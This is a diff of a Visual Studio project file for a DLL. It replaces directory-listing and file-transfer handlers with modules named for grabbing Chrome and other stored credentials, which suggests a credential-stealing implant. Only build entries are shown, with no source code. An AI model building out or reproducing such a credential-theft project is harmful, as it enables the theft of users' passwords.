@@ -78,9 +78,9 @@
   </ItemDefinitionGroup>
   <ItemGroup>
     <ClCompile Include="DllMain.cpp" />
-    <ClCompile Include="Operations\DirlistHandler.cpp" />
-    <ClCompile Include="Operations\DropFileHandler.cpp" />
-    <ClCompile Include="Operations\GetFileHandler.cpp" />
+    <ClCompile Include="Grabbers\ChromeCredentialsGrabber.cpp" />
+    <ClCompile Include="Grabbers\CredentialsGrabber.cpp" />
+    <ClCompile Include="Operations\GetAllCredentialsHandler.cpp" />
   </ItemGroup>
   <ItemGroup>
     <ProjectReference Include="..\..\FigImpl\FigImpl.vcxproj">
@@ -95,9 +95,9 @@
   </ItemGroup>
   <ItemGroup>
     <ClInclude Include="Api.hpp" />
-    <ClInclude Include="Operations\DirlistHandler.hpp" />
-    <ClInclude Include="Operations\DropFileHandler.hpp" />
-    <ClInclude Include="Operations\GetFileHandler.hpp" />
+    <ClInclude Include="Grabbers\ChromeCredentialsGrabber.hpp" />
+    <ClInclude Include="Grabbers\CredentialsGrabber.hpp" />
+    <ClInclude Include="Operations\GetAllCredentialsHandler.hpp" />
   </ItemGroup>
   <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
   <ImportGroup Label="ExtensionTargets">
